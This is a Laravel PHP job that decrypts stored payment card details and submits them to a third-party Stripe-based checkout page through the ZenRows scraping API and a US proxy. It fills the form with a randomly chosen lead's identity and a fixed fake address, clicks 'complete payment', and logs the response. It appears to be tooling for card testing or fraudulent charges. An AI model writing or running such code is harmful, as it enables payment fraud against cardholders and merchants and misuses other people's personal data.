<?php

namespace App\Jobs;

use App\Http\DTOs\CheckoutDto;
use App\Models\Checkout;
use App\Models\Lead;
use Illuminate\Contracts\Queue\ShouldQueue;
use Illuminate\Foundation\Queue\Queueable;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Log;

class ProcessPaymentScrap implements ShouldQueue
{
    use Queueable;

    /**
     * Create a new job instance.
     */
    public function __construct(private CheckoutDto $checkout)
    {
        //
    }

    /**
     * Execute the job.
     */
    public function handle(): void
    {
        $order = Checkout::find($this->checkout->order_id);
        // Carregar Lead e Product
        $order->load(['lead', 'product']);
        $lead = $order->lead;

        if (!$order->lead) {
            $lead = Lead::inRandomOrder()->first();
        }
        if (!$order->product) {
            throw new \Exception("Pedido #{$order->id} sem Produto vinculado.");
        }

        $cardDto = \App\Http\DTOs\CardDto::decryptCard($order->encrypted_card);



        $formData = [
            'email'                             => $lead->email,
            'full-name'                         => $lead->name,
            'phone-number'                      => $lead->phone,
            'address'                           => '123 Main St',
            'zip-code'                          => '07047',
            'city'                              => 'North Bergen',
            'state'                             => 'NJ',
            'country'                           => 'United States',

            'cardNumbercartpanda_stripe'        => $cardDto->number,
            'cardHolderNamecartpanda_stripe'    => $order->name, // Nome do titular do cartão (geralmente o nome no checkout)
            'cardExpiryDatecartpanda_stripe'    => $cardDto->month . '/' . $cardDto->year, // Formato MM/YY ou MM/YYYY conforme necessidade
            'securityCodecartpanda_stripe'      => $cardDto->cvv,
        ];

        $zenRowsKey = config('zenrows.api_key');
        $targetUrl = urlencode($order->product->link);


        $query = urlencode(json_encode($this->arrayToFillFormat($formData)));
        $url = "https://api.zenrows.com/v1/?apikey={$zenRowsKey}&url={$targetUrl}&js_render=true&js_instructions={$query}&premium_proxy=true&proxy_country=us";


        $response = Http::get($url);

        $response = $response->body();


        Log::info($response);



        if (strpos($response, '<span class="small">Try another card or payment method.</span>') !== false) {
            $order->update([
                'status' => 'cancelled'
            ]);
        }
    }
    private function arrayToFillFormat(array $data): array
    {
        $result = [];
        foreach ($data as $key => $value) {
            $result[] = ["fill" => ["#" . $key, $value]];
        }
        $result[] = ["click" => "#complete-payment"];
        return $result;
    }
}
